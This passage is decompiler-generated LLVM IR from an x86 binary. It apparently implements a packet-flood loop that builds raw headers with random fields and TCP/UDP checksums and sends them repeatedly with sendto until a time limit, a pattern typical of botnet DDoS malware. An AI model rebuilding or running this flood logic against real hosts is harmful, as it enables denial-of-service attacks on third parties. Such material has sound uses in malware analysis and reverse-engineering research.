  %v1_804b695 = and i32 %v2_804b689, -13
  %tmp91 = urem i8 %v3_804b68e, 2
  %v1_804b698 = zext i8 %tmp91 to i32
  %v2_804b69b = or i32 %v2_804b692, %v1_804b695
  store i32 %v2_804b69b, i32* %eax.global-to-local, align 4
  %tmp92 = sub nsw i32 0, %v1_804b698
  %v2_804b69d = and i32 %tmp92, 4
  store i32 %v2_804b69d, i32* %edx.global-to-local, align 4
  %v1_804b6a0 = add i32 %v0_804b669, 59
  %v2_804b6a0 = inttoptr i32 %v1_804b6a0 to i8*
  %v3_804b6a0 = load i8, i8* %v2_804b6a0, align 1
  %v4_804b6a0 = zext i8 %v3_804b6a0 to i32
  store i32 %v4_804b6a0, i32* %ecx.global-to-local, align 4
  %v2_804b6a4 = or i32 %v2_804b69d, %v2_804b69b
  store i32 %v2_804b6a4, i32* %eax.global-to-local, align 4
  %v1_804b6a6 = add i32 %v0_804b669, 58
  %v2_804b6a6 = inttoptr i32 %v1_804b6a6 to i8*
  %v3_804b6a6 = load i8, i8* %v2_804b6a6, align 1
  %v4_804b6a6 = zext i8 %v3_804b6a6 to i32
  %v1_804b6ad = and i32 %v2_804b6a4, -4
  %v1_804b6aa = mul nuw nsw i32 %v4_804b6a6, 2
  %v2_804b6b0 = and i32 %v1_804b6aa, 2
  store i32 %v2_804b6b0, i32* %edx.global-to-local, align 4
  %tmp93 = urem i8 %v3_804b6a0, 2
  %v1_804b6b2 = zext i8 %tmp93 to i32
  store i32 %v1_804b6b2, i32* %ecx.global-to-local, align 4
  %v2_804b6b5 = or i32 %v1_804b6b2, %v1_804b6ad
  %v2_804b6b7 = or i32 %v2_804b6b5, %v2_804b6b0
  %v5_804b6b7 = trunc i32 %v2_804b6b7 to i8
  store i32 %v2_804b6b7, i32* %eax.global-to-local, align 4
  %v1_804b6b9 = add i32 %v0_804b669, 72
  %v2_804b6b9 = inttoptr i32 %v1_804b6b9 to i32*
  %v3_804b6b9 = load i32, i32* %v2_804b6b9, align 4
  store i32 %v3_804b6b9, i32* %ecx.global-to-local, align 4
  %v3_804b6bd = add i32 %v3_804b6b9, 13
  %v4_804b6bd = inttoptr i32 %v3_804b6bd to i8*
  store i8 %v5_804b6b7, i8* %v4_804b6bd, align 1
  %v0_804b6c0 = load i32, i32* @ebp, align 4
  %v1_804b6c0 = load i32, i32* @esp, align 4
  %v2_804b6c0 = add i32 %v1_804b6c0, -4
  %v3_804b6c0 = inttoptr i32 %v2_804b6c0 to i32*
  store i32 %v0_804b6c0, i32* %v3_804b6c0, align 4
  %v0_804b6c1 = load i32, i32* @ebp, align 4
  %v2_804b6c1 = add i32 %v1_804b6c0, -8
  %v3_804b6c1 = inttoptr i32 %v2_804b6c1 to i32*
  store i32 %v0_804b6c1, i32* %v3_804b6c1, align 4
  %v1_804b6c2 = add i32 %v1_804b6c0, 60
  %v2_804b6c2 = inttoptr i32 %v1_804b6c2 to i32*
  %v3_804b6c2 = load i32, i32* %v2_804b6c2, align 4
  store i32 %v3_804b6c2, i32* @edi, align 4
  %v2_804b6c6 = add i32 %v1_804b6c0, -12
  %v3_804b6c6 = inttoptr i32 %v2_804b6c6 to i32*
  store i32 %v3_804b6c2, i32* %v3_804b6c6, align 4
  %v0_804b6c7 = load i32, i32* @esi, align 4
  %v2_804b6c7 = add i32 %v1_804b6c0, -16
  %v3_804b6c7 = inttoptr i32 %v2_804b6c7 to i32*
  store i32 %v0_804b6c7, i32* %v3_804b6c7, align 4
  %v0_804b6c8 = load i32, i32* %stack_var_-412, align 4
  %v2_804b6c8 = inttoptr i32 %v0_804b6c8 to i8*
  %v3_804b6c8 = call i32 @rand_alphastr(i8* %v2_804b6c8, i32 3)
  store i32 %v3_804b6c8, i32* %eax.global-to-local, align 4
  %v0_804b6cd = load i32, i32* @esp, align 4
  %v1_804b6cd = add i32 %v0_804b6cd, 76
  %v2_804b6cd = inttoptr i32 %v1_804b6cd to i32*
  %v3_804b6cd = load i32, i32* %v2_804b6cd, align 4
  %v0_804b6d4 = load i32, i32* @ebx, align 4
  %v2_804b6d4 = add i32 %v3_804b6cd, 40
  %v3_804b6d4 = add i32 %v2_804b6d4, %v0_804b6d4
  %v4_804b6d4 = inttoptr i32 %v3_804b6d4 to i8*
  store i8 0, i8* %v4_804b6d4, align 1
  %v0_804b6d9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b6d9

dec_label_pc_804b6d9:                             ; preds = %dec_label_pc_804b360, %dec_label_pc_804b5f9
  %v1_804b6e1 = phi i32 [ %v0_804b6d9.pre, %dec_label_pc_804b5f9 ], [ %v1_804b36c, %dec_label_pc_804b360 ]
  %v1_804b6d9 = add i32 %v1_804b6e1, 376
  %v2_804b6d9 = inttoptr i32 %v1_804b6d9 to i32*
  %v3_804b6d9 = load i32, i32* %v2_804b6d9, align 4
  %v1_804b6e0 = add i32 %v3_804b6d9, 1
  store i32 %v1_804b6e0, i32* %eax.global-to-local, align 4
  store i32 %v1_804b6e0, i32* %v2_804b6d9, align 4
  %v0_804b6e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b6e8 = load i32, i32* @esp, align 4
  %v2_804b6e8 = add i32 %v1_804b6e8, 28
  %v3_804b6e8 = inttoptr i32 %v2_804b6e8 to i32*
  %v4_804b6e8 = load i32, i32* %v3_804b6e8, align 4
  %v5_804b6e8 = sub i32 %v0_804b6e8, %v4_804b6e8
  %v11_804b6e8 = xor i32 %v4_804b6e8, %v0_804b6e8
  %v12_804b6e8 = xor i32 %v5_804b6e8, %v0_804b6e8
  %v13_804b6e8 = and i32 %v12_804b6e8, %v11_804b6e8
  %v14_804b6e8 = icmp slt i32 %v13_804b6e8, 0
  %v16_804b6e8 = icmp slt i32 %v5_804b6e8, 0
  %v2_804b6ec = icmp eq i1 %v16_804b6e8, %v14_804b6e8
  br i1 %v2_804b6ec, label %dec_label_pc_804b6f2, label %dec_label_pc_804b34e

dec_label_pc_804b6f2:                             ; preds = %dec_label_pc_804b6d9, %dec_label_pc_804b31e
  %v1_804b700 = phi i32 [ %v12_804b1ed, %dec_label_pc_804b31e ], [ %v1_804b6e8, %dec_label_pc_804b6d9 ]
  %v1_804b6f2 = add i32 %v1_804b700, 60
  %v2_804b6f2 = inttoptr i32 %v1_804b6f2 to i32*
  %v3_804b6f2 = load i32, i32* %v2_804b6f2, align 4
  store i32 %v3_804b6f2, i32* %eax.global-to-local, align 4
  %v3_804b6f6 = load i32, i32* %v2_804b6f2, align 4
  %v1_804b6fa = add i32 %v3_804b6f2, 20
  store i32 %v1_804b6fa, i32* %eax.global-to-local, align 4
  %v1_804b6fd = add i32 %v3_804b6f6, 40
  store i32 %v1_804b6fd, i32* %edx.global-to-local, align 4
  %v2_804b700 = add i32 %v1_804b700, 20
  %v3_804b700 = inttoptr i32 %v2_804b700 to i32*
  store i32 %v1_804b6fa, i32* %v3_804b700, align 4
  %v0_804b704 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b704 = load i32, i32* @esp, align 4
  %v2_804b704 = add i32 %v1_804b704, 16
  %v3_804b704 = inttoptr i32 %v2_804b704 to i32*
  store i32 %v0_804b704, i32* %v3_804b704, align 4
  %v0_804b708.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b708

dec_label_pc_804b708:                             ; preds = %dec_label_pc_804b839, %dec_label_pc_804b6f2
  %v0_804b708 = phi i32 [ %v1_804b843, %dec_label_pc_804b839 ], [ %v0_804b708.pre, %dec_label_pc_804b6f2 ]
  %v1_804b708 = add i32 %v0_804b708, 376
  %v2_804b708 = inttoptr i32 %v1_804b708 to i32*
  store i32 0, i32* %v2_804b708, align 4
  %v0_804b713 = load i32, i32* @esp, align 4
  %v1_804b713 = add i32 %v0_804b713, 27
  %v2_804b713 = inttoptr i32 %v1_804b713 to i8*
  %v3_804b713 = load i8, i8* %v2_804b713, align 1
  %v4_804b713 = icmp eq i8 %v3_804b713, 0
  br i1 %v4_804b713, label %dec_label_pc_804b839, label %dec_label_pc_804b71e

dec_label_pc_804b71e:                             ; preds = %dec_label_pc_804b708
  %v1_804b71e = add i32 %v0_804b713, 60
  %v2_804b71e = inttoptr i32 %v1_804b71e to i32*
  %v3_804b71e = load i32, i32* %v2_804b71e, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804b724 = add i32 %v3_804b71e, 20
  %v1_804b727 = trunc i32 %v1_804b724 to i16
  %v2_804b727 = call i16 @llvm.bswap.i16(i16 %v1_804b727)
  %v3_804b727 = zext i16 %v2_804b727 to i32
  %v5_804b727 = and i32 %v1_804b724, -65536
  %v6_804b727 = or i32 %v3_804b727, %v5_804b727
  store i32 %v6_804b727, i32* %eax.global-to-local, align 4
  store i32 %v3_804b727, i32* @ebp, align 4
  br label %dec_label_pc_804b7f0

dec_label_pc_804b738:                             ; preds = %dec_label_pc_804b802, %dec_label_pc_804b80d
  %v0_804b738 = load i32, i32* @esi, align 4
  %v1_804b738 = add i32 %v0_804b738, 10
  %v2_804b738 = inttoptr i32 %v1_804b738 to i16*
  store i16 0, i16* %v2_804b738, align 2
  %v0_804b73e = load i32, i32* %eax.global-to-local, align 4
  %v1_804b73e = load i32, i32* @esp, align 4
  %v2_804b73e = add i32 %v1_804b73e, -4
  %v3_804b73e = inttoptr i32 %v2_804b73e to i32*
  store i32 %v0_804b73e, i32* %v3_804b73e, align 4
  %v0_804b73f = load i32, i32* %eax.global-to-local, align 4
  %v2_804b73f = add i32 %v1_804b73e, -8
  %v3_804b73f = inttoptr i32 %v2_804b73f to i32*
  store i32 %v0_804b73f, i32* %v3_804b73f, align 4
  %v1_804b740 = add i32 %v1_804b73e, -12
  %v2_804b740 = inttoptr i32 %v1_804b740 to i32*
  store i32 20, i32* %v2_804b740, align 4
  %v0_804b742 = load i32, i32* @esi, align 4
  %v2_804b742 = add i32 %v1_804b73e, -16
  %v3_804b742 = inttoptr i32 %v2_804b742 to i32*
  store i32 %v0_804b742, i32* %v3_804b742, align 4
  %v0_804b743 = load i32, i32* %stack_var_-412, align 4
  %v2_804b743 = inttoptr i32 %v0_804b743 to i16*
  %v3_804b743 = call i32 @checksum_generic(i16* %v2_804b743, i32 3)
  %v4_804b743 = trunc i32 %v3_804b743 to i16
  store i32 %v3_804b743, i32* %eax.global-to-local, align 4
  %v0_804b748 = load i32, i32* @esp, align 4
  %v1_804b748 = add i32 %v0_804b748, 392
  %v2_804b748 = inttoptr i32 %v1_804b748 to i32*
  %v3_804b748 = load i32, i32* %v2_804b748, align 4
  store i32 %v3_804b748, i32* %ecx.global-to-local, align 4
  %v3_804b74f = load i32, i32* @esi, align 4
  %v4_804b74f = add i32 %v3_804b74f, 10
  %v5_804b74f = inttoptr i32 %v4_804b74f to i16*
  store i16 %v4_804b743, i16* %v5_804b74f, align 2
  %v0_804b753 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b753 = mul i32 %v0_804b753, 16
  store i32 %v2_804b753, i32* %ecx.global-to-local, align 4
  %v0_804b756 = load i32, i32* @esp, align 4
  %v1_804b756 = add i32 %v0_804b756, 48
  %v2_804b756 = inttoptr i32 %v1_804b756 to i32*
  %v3_804b756 = load i32, i32* %v2_804b756, align 4
  store i32 %v3_804b756, i32* %eax.global-to-local, align 4
  store i32 %v2_804b753, i32* %ebx.global-to-local, align 4
  %v0_804b75c = load i32, i32* @edi, align 4
  %v1_804b75c = add i32 %v0_804b75c, 16
  %v2_804b75c = inttoptr i32 %v1_804b75c to i16*
  store i16 0, i16* %v2_804b75c, align 2
  %v0_804b762 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b762 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b762 = add i32 %v1_804b762, %v0_804b762
  store i32 %v2_804b762, i32* @ebx, align 4
  %v1_804b764 = add i32 %v2_804b762, 4
  %v2_804b764 = inttoptr i32 %v1_804b764 to i32*
  %v3_804b764 = load i32, i32* %v2_804b764, align 4
  store i32 %v3_804b764, i32* %eax.global-to-local, align 4
  %v1_804b767 = add i32 %v3_804b764, 1
  store i32 %v1_804b767, i32* %edx.global-to-local, align 4
  store i32 %v1_804b767, i32* %v2_804b764, align 4
  %v0_804b76d = load i32, i32* @esp, align 4
  %v1_804b76d = add i32 %v0_804b76d, 48
  %v2_804b76d = inttoptr i32 %v1_804b76d to i32*
  %v3_804b76d = load i32, i32* %v2_804b76d, align 4
  store i32 %v3_804b76d, i32* %edx.global-to-local, align 4
  %v1_804b771 = trunc i32 %v3_804b764 to i16
  %v2_804b771 = call i16 @llvm.bswap.i16(i16 %v1_804b771)
  %v3_804b771 = zext i16 %v2_804b771 to i32
  store i32 %v3_804b771, i32* %eax.global-to-local, align 4
  %v1_804b77a = load i32, i32* @edi, align 4
  %v2_804b77a = add i32 %v1_804b77a, 4
  %v3_804b77a = inttoptr i32 %v2_804b77a to i32*
  store i32 %v3_804b771, i32* %v3_804b77a, align 4
  %v0_804b77d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b77d = load i32, i32* %edx.global-to-local, align 4
  %v2_804b77d = add i32 %v0_804b77d, 8
  %v3_804b77d = add i32 %v2_804b77d, %v1_804b77d
  %v4_804b77d = inttoptr i32 %v3_804b77d to i32*
  %v5_804b77d = load i32, i32* %v4_804b77d, align 4
  store i32 %v5_804b77d, i32* %eax.global-to-local, align 4
  %v0_804b781 = load i32, i32* @esp, align 4
  %v1_804b781 = add i32 %v0_804b781, 36
  %v2_804b781 = inttoptr i32 %v1_804b781 to i32*
  %v3_804b781 = load i32, i32* %v2_804b781, align 4
  store i32 %v3_804b781, i32* %ecx.global-to-local, align 4
  %v1_804b785 = trunc i32 %v5_804b77d to i16
  %v2_804b785 = call i16 @llvm.bswap.i16(i16 %v1_804b785)
  %v3_804b785 = zext i16 %v2_804b785 to i32
  store i32 %v3_804b785, i32* %eax.global-to-local, align 4
  %v1_804b78e = load i32, i32* @edi, align 4
  %v2_804b78e = add i32 %v1_804b78e, 8
  %v3_804b78e = inttoptr i32 %v2_804b78e to i32*
  store i32 %v3_804b785, i32* %v3_804b78e, align 4
  %v0_804b791 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b791 = load i32, i32* @esp, align 4
  %v2_804b791 = add i32 %v1_804b791, -4
  %v3_804b791 = inttoptr i32 %v2_804b791 to i32*
  store i32 %v0_804b791, i32* %v3_804b791, align 4
  %v0_804b792 = load i32, i32* @ebp, align 4
  %v2_804b792 = add i32 %v1_804b791, -8
  %v3_804b792 = inttoptr i32 %v2_804b792 to i32*
  store i32 %v0_804b792, i32* %v3_804b792, align 4
  %v0_804b793 = load i32, i32* @edi, align 4
  %v2_804b793 = add i32 %v1_804b791, -12
  %v3_804b793 = inttoptr i32 %v2_804b793 to i32*
  store i32 %v0_804b793, i32* %v3_804b793, align 4
  %v0_804b794 = load i32, i32* @esi, align 4
  %v2_804b794 = add i32 %v1_804b791, -16
  %v3_804b794 = inttoptr i32 %v2_804b794 to i32*
  store i32 %v0_804b794, i32* %v3_804b794, align 4
  %v0_804b795 = load i32, i32* %stack_var_-412, align 4
  %v4_804b795 = call i32 @checksum_tcpudp(i32 %v0_804b795, i16* inttoptr (i32 3 to i16*), i32 6)
  %v5_804b795 = trunc i32 %v4_804b795 to i16
  store i32 %v4_804b795, i32* %eax.global-to-local, align 4
  %v3_804b79a = load i32, i32* @edi, align 4
  %v4_804b79a = add i32 %v3_804b79a, 16
  %v5_804b79a = inttoptr i32 %v4_804b79a to i16*
  store i16 %v5_804b795, i16* %v5_804b79a, align 2
  %v0_804b79e = load i32, i32* @esp, align 4
  %v1_804b79e = add i32 %v0_804b79e, 408
  %v2_804b79e = inttoptr i32 %v1_804b79e to i32*
  %v3_804b79e = load i32, i32* %v2_804b79e, align 4
  store i32 %v3_804b79e, i32* %eax.global-to-local, align 4
  %v1_804b7a5 = add i32 %v0_804b79e, 440
  %v2_804b7a5 = inttoptr i32 %v1_804b7a5 to i32*
  %v3_804b7a5 = load i32, i32* %v2_804b7a5, align 4
  store i32 %v3_804b7a5, i32* %ecx.global-to-local, align 4
  %v0_804b7ac = load i32, i32* @edi, align 4
  %v1_804b7ac = add i32 %v0_804b7ac, 2
  %v2_804b7ac = inttoptr i32 %v1_804b7ac to i16*
  %v3_804b7ac = load i16, i16* %v2_804b7ac, align 2
  %v4_804b7ac = zext i16 %v3_804b7ac to i32
  %v5_804b7ac = load i32, i32* @edx, align 4
  %v6_804b7ac = and i32 %v5_804b7ac, -65536
  %v7_804b7ac = or i32 %v6_804b7ac, %v4_804b7ac
  store i32 %v7_804b7ac, i32* %edx.global-to-local, align 4
  %v2_804b7b6 = mul i32 %v3_804b79e, 24
  store i32 %v2_804b7b6, i32* %eax.global-to-local, align 4
  %v4_804b7b9 = or i32 %v2_804b7b6, 2
  %v5_804b7b9 = add i32 %v4_804b7b9, %v3_804b7a5
  %v6_804b7b9 = inttoptr i32 %v5_804b7b9 to i16*
  store i16 %v3_804b7ac, i16* %v6_804b7b9, align 2
  %v0_804b7be = load i32, i32* %eax.global-to-local, align 4
  %v1_804b7be = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b7be = add i32 %v1_804b7be, %v0_804b7be
  store i32 %v2_804b7be, i32* %eax.global-to-local, align 4
  %v0_804b7c0 = load i32, i32* @esp, align 4
  %v1_804b7c0 = add i32 %v0_804b7c0, -4
  %v2_804b7c0 = inttoptr i32 %v1_804b7c0 to i32*
  store i32 16, i32* %v2_804b7c0, align 4
  %v0_804b7c2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b7c2 = add i32 %v0_804b7c0, -8
  %v3_804b7c2 = inttoptr i32 %v2_804b7c2 to i32*
  store i32 %v0_804b7c2, i32* %v3_804b7c2, align 4
  %v1_804b7c3 = add i32 %v0_804b7c0, -12
  %v2_804b7c3 = inttoptr i32 %v1_804b7c3 to i32*
  store i32 16384, i32* %v2_804b7c3, align 4
  %v1_804b7c8 = add i32 %v0_804b7c0, 24
  %v2_804b7c8 = inttoptr i32 %v1_804b7c8 to i32*
  %v3_804b7c8 = load i32, i32* %v2_804b7c8, align 4
  store i32 %v3_804b7c8, i32* %edx.global-to-local, align 4
  %v2_804b7cc = add i32 %v0_804b7c0, -16
  %v3_804b7cc = inttoptr i32 %v2_804b7cc to i32*
  store i32 %v3_804b7c8, i32* %v3_804b7cc, align 4
  %v0_804b7cd = load i32, i32* @esi, align 4
  %v2_804b7cd = add i32 %v0_804b7c0, -20
  %v3_804b7cd = inttoptr i32 %v2_804b7cd to i32*
  store i32 %v0_804b7cd, i32* %v3_804b7cd, align 4
  %v1_804b7ce = add i32 %v0_804b7c0, 48
  %v2_804b7ce = inttoptr i32 %v1_804b7ce to i32*
  %v3_804b7ce = load i32, i32* %v2_804b7ce, align 4
  store i32 %v3_804b7ce, i32* %eax.global-to-local, align 4
  %v2_804b7d2 = add i32 %v0_804b7c0, -24
  %v3_804b7d2 = inttoptr i32 %v2_804b7d2 to i32*
  store i32 %v3_804b7ce, i32* %v3_804b7d2, align 4
  %v0_804b7d3 = load i32, i32* %stack_var_-412, align 4
  %v4_804b7d3 = load i32, i32* %stack_var_-396, align 4
  %v6_804b7d3 = call i32 @__libc_sendto(i32 %v0_804b7d3, i32 3, i32 6, i32 768, i32 %v4_804b7d3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804b7d3, i32* %eax.global-to-local, align 4
  %v0_804b7d8 = load i32, i32* @esp, align 4
  %v1_804b7d8 = add i32 %v0_804b7d8, 408
  %v2_804b7d8 = inttoptr i32 %v1_804b7d8 to i32*
  %v3_804b7d8 = load i32, i32* %v2_804b7d8, align 4
  %v1_804b7df = add i32 %v3_804b7d8, 1
  store i32 %v1_804b7df, i32* %edx.global-to-local, align 4
  store i32 %v1_804b7df, i32* %v2_804b7d8, align 4
  %v0_804b7e7 = load i32, i32* @esp, align 4
  %v1_804b7e7 = add i32 %v0_804b7e7, 32
  %v1_804b7ea = add i32 %v0_804b7e7, 60
  %v2_804b7ea = inttoptr i32 %v1_804b7ea to i32*
  %v3_804b7ea = load i32, i32* %v2_804b7ea, align 4
  %v4_804b7ea = load i32, i32* %edx.global-to-local, align 4
  %v5_804b7ea = sub i32 %v3_804b7ea, %v4_804b7ea
  %v11_804b7ea = xor i32 %v4_804b7ea, %v3_804b7ea
  %v12_804b7ea = xor i32 %v5_804b7ea, %v3_804b7ea
  %v13_804b7ea = and i32 %v12_804b7ea, %v11_804b7ea
  %v14_804b7ea = icmp slt i32 %v13_804b7ea, 0
  %v15_804b7ea = icmp eq i32 %v5_804b7ea, 0
  %v16_804b7ea = icmp slt i32 %v5_804b7ea, 0
  %v3_804b7ee = icmp ne i1 %v16_804b7ea, %v14_804b7ea
  %v4_804b7ee = or i1 %v15_804b7ea, %v3_804b7ee
  br i1 %v4_804b7ee, label %dec_label_pc_804b839, label %dec_label_pc_804b7f0

dec_label_pc_804b7f0:                             ; preds = %dec_label_pc_804b738, %dec_label_pc_804b71e
  %v1_804b7fa = phi i32 [ %v4_804b7ea, %dec_label_pc_804b738 ], [ 0, %dec_label_pc_804b71e ]
  %v0_804b7f0 = phi i32 [ %v1_804b7e7, %dec_label_pc_804b738 ], [ %v0_804b713, %dec_label_pc_804b71e ]
  %v1_804b7f0 = add i32 %v0_804b7f0, 36
  %v2_804b7f0 = inttoptr i32 %v1_804b7f0 to i32*
  %v3_804b7f0 = load i32, i32* %v2_804b7f0, align 4
  store i32 %v3_804b7f0, i32* @ecx, align 4
  %v1_804b7f4 = add i32 %v0_804b7f0, 48
  %v2_804b7f4 = inttoptr i32 %v1_804b7f4 to i16*
  %v3_804b7f4 = load i16, i16* %v2_804b7f4, align 2
  %v13_804b7f4 = icmp eq i16 %v3_804b7f4, -1
  %v2_804b7fa = mul i32 %v1_804b7fa, 4
  %v3_804b7fa = add i32 %v3_804b7f0, %v2_804b7fa
  %v4_804b7fa = inttoptr i32 %v3_804b7fa to i32*
  %v5_804b7fa = load i32, i32* %v4_804b7fa, align 4
  store i32 %v5_804b7fa, i32* @esi, align 4
  %v1_804b7fd = add i32 %v5_804b7fa, 20
  store i32 %v1_804b7fd, i32* @edi, align 4
  br i1 %v13_804b7f4, label %dec_label_pc_804b82e, label %dec_label_pc_804b802

dec_label_pc_804b802:                             ; preds = %dec_label_pc_804b7f0, %dec_label_pc_804b82e
  %v1_804b80d = phi i32 [ %v0_804b7f0, %dec_label_pc_804b7f0 ], [ %v0_804b802.pre, %dec_label_pc_804b82e ]
  %v1_804b802 = add i32 %v1_804b80d, 67
  %v2_804b802 = inttoptr i32 %v1_804b802 to i8*
  %v3_804b802 = load i8, i8* %v2_804b802, align 1
  %v4_804b802 = icmp eq i8 %v3_804b802, 0
  br i1 %v4_804b802, label %dec_label_pc_804b738, label %dec_label_pc_804b80d

dec_label_pc_804b80d:                             ; preds = %dec_label_pc_804b802
  %v0_804b80d = load i32, i32* @ecx, align 4
  %v2_804b80d = add i32 %v1_804b80d, -4
  %v3_804b80d = inttoptr i32 %v2_804b80d to i32*
  store i32 %v0_804b80d, i32* %v3_804b80d, align 4
  %v0_804b80e = load i32, i32* @ecx, align 4
  %v2_804b80e = add i32 %v1_804b80d, -8
  %v3_804b80e = inttoptr i32 %v2_804b80e to i32*
  store i32 %v0_804b80e, i32* %v3_804b80e, align 4
  %v1_804b80f = add i32 %v1_804b80d, 60
  %v2_804b80f = inttoptr i32 %v1_804b80f to i32*
  %v3_804b80f = load i32, i32* %v2_804b80f, align 4
  store i32 %v3_804b80f, i32* %edx.global-to-local, align 4
  %v0_804b813 = load i32, i32* @esi, align 4
  %v1_804b813 = add i32 %v0_804b813, 40
  store i32 %v1_804b813, i32* %eax.global-to-local, align 4
  %v2_804b816 = add i32 %v1_804b80d, -12
  %v3_804b816 = inttoptr i32 %v2_804b816 to i32*
  store i32 %v3_804b80f, i32* %v3_804b816, align 4
  %v0_804b817 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b817 = add i32 %v1_804b80d, -16
  %v3_804b817 = inttoptr i32 %v2_804b817 to i32*
  store i32 %v0_804b817, i32* %v3_804b817, align 4
  %v0_804b818 = load i32, i32* %stack_var_-412, align 4
  %v2_804b818 = inttoptr i32 %v0_804b818 to i8*
  %v3_804b818 = call i32 @rand_alphastr(i8* %v2_804b818, i32 3)
  store i32 %v3_804b818, i32* %eax.global-to-local, align 4
  %v0_804b81d = load i32, i32* @esp, align 4
  %v1_804b81d = add i32 %v0_804b81d, 76
  %v2_804b81d = inttoptr i32 %v1_804b81d to i32*
  %v3_804b81d = load i32, i32* %v2_804b81d, align 4
  store i32 %v3_804b81d, i32* %eax.global-to-local, align 4
  %v1_804b824 = load i32, i32* @esi, align 4
  %v2_804b824 = add i32 %v3_804b81d, 40
  %v3_804b824 = add i32 %v2_804b824, %v1_804b824
  %v4_804b824 = inttoptr i32 %v3_804b824 to i8*
  store i8 0, i8* %v4_804b824, align 1
  br label %dec_label_pc_804b738

dec_label_pc_804b82e:                             ; preds = %dec_label_pc_804b7f0
  %v0_804b82e = load i32, i32* %stack_var_-412, align 4
  %v1_804b82e = call i32 @rand_next(i32 %v0_804b82e)
  store i32 %v1_804b82e, i32* %eax.global-to-local, align 4
  %v1_804b833 = trunc i32 %v1_804b82e to i16
  %v2_804b833 = load i32, i32* @esi, align 4
  %v3_804b833 = add i32 %v2_804b833, 4
  %v4_804b833 = inttoptr i32 %v3_804b833 to i16*
  store i16 %v1_804b833, i16* %v4_804b833, align 2
  %v0_804b802.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b802

dec_label_pc_804b839:                             ; preds = %dec_label_pc_804b738, %dec_label_pc_804b708
  %v0_804b839 = phi i32 [ %v0_804b713, %dec_label_pc_804b708 ], [ %v1_804b7e7, %dec_label_pc_804b738 ]
  %v1_804b83c = add i32 %v0_804b839, -16
  %v2_804b83c = inttoptr i32 %v1_804b83c to i32*
  store i32 0, i32* %v2_804b83c, align 4
  %v0_804b83e = load i32, i32* %stack_var_-412, align 4
  %v1_804b83e = inttoptr i32 %v0_804b83e to i32*
  %v2_804b83e = call i32 @__GI_time(i32* %v1_804b83e)
  store i32 %v2_804b83e, i32* %eax.global-to-local, align 4
  %v0_804b843 = load i32, i32* @esp, align 4
  %v1_804b843 = add i32 %v0_804b843, 16
  %v1_804b846 = add i32 %v0_804b843, 84
  %v2_804b846 = inttoptr i32 %v1_804b846 to i32*
  %v3_804b846 = load i32, i32* %v2_804b846, align 4
  %v5_804b846 = sub i32 %v3_804b846, %v2_804b83e
  %v11_804b846 = xor i32 %v3_804b846, %v2_804b83e
  %v12_804b846 = xor i32 %v5_804b846, %v3_804b846
  %v13_804b846 = and i32 %v12_804b846, %v11_804b846
  %v14_804b846 = icmp slt i32 %v13_804b846, 0
  %v16_804b846 = icmp slt i32 %v5_804b846, 0
  %v2_804b84a = icmp eq i1 %v16_804b846, %v14_804b846
  br i1 %v2_804b84a, label %dec_label_pc_804b708, label %dec_label_pc_804b4d1

; uselistorder directives
  uselistorder i32 %v5_804b846, { 1, 0 }
  uselistorder i32 %v2_804b83e, { 1, 2, 3, 0 }
  uselistorder i32 %v1_804b80d, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v0_804b7f0, { 0, 2, 1 }
  uselistorder i32 %v5_804b7ea, { 1, 2, 0 }
  uselistorder i32 %v4_804b7ea, { 1, 0, 2 }
  uselistorder i32 %v2_804b753, { 1, 0 }
  uselistorder i32 %v3_804b727, { 1, 0 }
  uselistorder i32 %v5_804b6e8, { 1, 0 }
  uselistorder i32 %v1_804b6e8, { 0, 2, 1 }
  uselistorder i32 %v0_804b669, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i32 %v1_804b658, { 0, 2, 1 }
  uselistorder i32 %v2_804b610, { 1, 0 }
  uselistorder i32 %v2_804b547, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 %v3_804b4ef, { 1, 0, 2 }
  uselistorder i32 %v2_804b4b4, { 1, 0 }
  uselistorder i32 %v4_804b485, { 1, 2, 0 }
  uselistorder i32 %v0_804b45a, { 0, 1, 2, 4, 5, 6, 7, 8, 9, 3 }
  uselistorder i32 %v1_804b41f, { 1, 0 }
  uselistorder i32 %v0_804b41c, { 1, 0 }
  uselistorder i32 %v2_804b41a, { 0, 2, 1, 3 }
  uselistorder i32 %v3_804b4dc, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v12_804b388, { 1, 0 }
  uselistorder i32 %v0_804b385, { 2, 0, 1 }
  uselistorder i32 %v0_804b36c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804b367, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804b360, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804b367, { 1, 0, 3, 4, 5, 6, 2 }
  uselistorder i32 %v3_804b2db, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v4_804b18a, { 3, 4, 1, 2, 0 }
  uselistorder i32* %stack_var_-412, { 2, 8, 4, 1, 9, 10, 3, 7, 0, 6, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %stack_var_-20, { 0, 3, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88 }
  uselistorder i32 408, { 1, 2, 0, 3 }
